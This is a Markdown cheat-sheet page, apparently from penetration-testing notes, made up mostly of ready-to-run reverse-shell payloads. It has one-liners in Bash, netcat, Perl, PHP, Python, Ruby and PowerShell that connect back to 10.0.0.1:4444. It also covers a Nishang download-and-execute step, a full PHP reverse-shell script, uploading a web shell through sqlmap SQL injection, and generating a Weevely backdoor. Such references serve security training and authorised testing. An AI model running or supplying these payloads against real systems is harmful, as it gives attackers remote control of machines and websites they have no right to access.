---
title: Reverse Shell
desc: 
tags: [Linux, Netcat, PrivEsc, Privilege, Reverse, Shell, Windows]
alts: [Linux-Privilege-Escalation, Windows-Privilege-Escalation]
render_with_liquid: false
---

## Basic Flow

First of all, open listener in local machine.

```sh
nc -lvnp 4444
```

- **Reverse Shell via Command Line**

    - **Bash**

        ```sh
        bash -i >&  /dev/tcp/10.0.0.1/4444 0>&1
        ```

    - **Netcat OpenBSD**

        ```sh
        rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f
        ```

    - **Perl**

        ```sh
        perl -e 'use Socket;$i="10.0.0.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
        ```

    - **PHP**

        ```sh
        php -r '$sock=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
        ```

    - **Python**

        ```sh
        export RHOST="10.0.0.1";export RPORT=4444;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
        ```

        - **Python3 & Bash**

            ```sh
            export RHOST="10.0.0.1";export RPORT=4444;python3 -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
            ```

    - **Ruby**

        ```sh
        ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
        ```

    - **PowerShell**

        ```sh
        powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

        powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
        ```

    - **Nishang**

        **[Nishang](https://github.com/samratashok/nishang){:target="_blank"}** is the Offensive PowerShell for red team, penetration testing and offensive security.

        1. **Preparing the Payload in Your Local Machine**

            First off, copy the payload to the current working directory.

            ```sh
            cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 .
            mv Invoke-PowerShellTcp.ps1 shell.ps1
            ```

            Add the following code to the final line in the payload (shell.ps1).

            ```powershell
            Invoke-PowerShellTcp -Reverse  -IPAddress <your-local-ip> -Port 4444
            ```

        2. **Opening Wev Server in Your Local Machine**

            To download the payload and execute the reverse shell in the target machine, open the web server in your local machine.

            ```sh
            python3 -m http.server 8000
            ```

        3. **Downloading the Payload and Executing Reverse Shell**

            In the target machine, download the local-hosted payload and run reverse shell.

            ```sh
            cmd /c powershell IEX (New-Object Net.WebClient).DownloadString('http://<your-local-ip>:8000/shell.ps1')
            ```

- **Reverse Shell via Website**

    -  **PHP Reverse Shell**

        [php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell){:target="_blank"} is an awesome payload against a website using PHP.

        ```sh
        wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O shell.php

        # Edit $ip and $port to your local ip:port in the payload
        ```

        Update $ip and $port in the payload to your local ip and port.

        Then upload the payload, or copy the content and paste to somewhere in the target website directly, and reload the page.

    - **PHP Reverse Shell (without fsockopen, and for FreeBSD)**

        If the target website validates 

        ```php
        <?php
        set_time_limit (0);
        $ip = '10.0.0.1';  // CHANGE THIS
        $port = 4444;      // CHANGE THIS

        // Spawn shell process
        $descriptorspec = array(
        0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
        1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
        2 => array("file", "/tmp/error-output.txt", "a")   // stderr is a pipe that the child will write to
        );

        $cwd = "/tmp";
        $env = array('some_option' => 'aeiou');

        $process = proc_open('sh', $descriptorspec, $pipes, $cwd, $env);

        if (is_resource($process)) {
            fwrite($pipes[0], 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f');
            fclose($pipes[0]);

            echo stream_get_contents($pipes[1]);
            fclose($pipes[1]);

            $return_value = proc_close($process);
            echo "command returned $return_value\n";
        }
        ?>
        ```

    - **Upload the Payload using SQLi**

        ```sh
        # req.txt: The request settings file which is saved using Burp Suite
        sqlmap -r req.txt --dbs --random-agent --batch --file-dest=/var/www/html/shell.php --file-write=./shell.php
        ```

    - **Useful Tools**

        - **[Weevely3](https://github.com/epinna/weevely3){:target="_blank"}**

            A web shell generator.

            1. **Generate Backdoor with Password**

                Credentials required.

                ```sh
                weevely generate <password> ./shell.php
                ```

            2. **Upload the Payload to Target Website and Execute Commands**

                ```sh
                weevely https://vulnerable.com/upload/shell.php <password> whoami
                ```

            3. **Get a Shell**

                ```sh
                weevely https://vulnerable.com/upload/shell.php <password>
                ```

<br />

## Upgrade to a Full Functional Shell

After connecting to target shell with reverse shell, it's recommended to make the shell to be more elegant.

```sh
SHELL=/bin/bash script -q /dev/null
# or
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

The commands below make "your" shell even more perfect.

```sh
Ctrl+z
stty raw -echo;fg
Enter x2
export TERM=xterm
```

<br />

## Pwncat

**[Pwncat](https://pwncat.org/){:target="_blank"}** is a reverse and bind shell handler.
